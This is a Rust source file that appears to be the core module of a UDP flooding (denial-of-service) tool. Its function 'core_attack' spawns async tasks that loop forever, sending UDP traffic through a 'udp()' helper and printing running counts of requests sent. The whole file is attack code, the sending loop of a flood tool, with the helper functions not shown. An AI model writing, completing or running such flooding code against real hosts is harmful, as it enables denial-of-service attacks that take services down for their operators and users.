use tokio::time::Instant;
use crate::extra_fn::{add_start, time_function, udp};
use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};


pub(crate) async fn core_attack() {
    if let Ok(threads) = SAFE_PUB_VAR.lock() {
        if threads.thread_on + 1.0 < threads.threads_allowed {
            add_start(threads);
            tokio::spawn(async {
                loop {
                    let (now, error_data) = (Instant::now(), udp().await);
                    match error_data {
                        Ok(_) => unsafe {
                            UNSAFE_PUB_VAR.amount_sent += 1.0;
                            println!(
                                "Threads on {},\n UDP Connected,\n Request sent per 10 mil {}\n Time Elapsed {}",
                                UNSAFE_PUB_VAR.threads_on,
                                UNSAFE_PUB_VAR.amount_sent,
                                now.elapsed().as_secs(),
                            );
                        }
                        Err(data) => unsafe {
                            println!(
                                "Threads on {}, Status ERROR {}\n  Request sent per 10 mil {}\n, Time Elapsed {}",
                                UNSAFE_PUB_VAR.threads_on,
                                data,
                                UNSAFE_PUB_VAR.amount_sent,
                                now.elapsed().as_secs()
                            );
                        }
                    }
                }
            });
        } else {
            time_function();
        }
    }
}

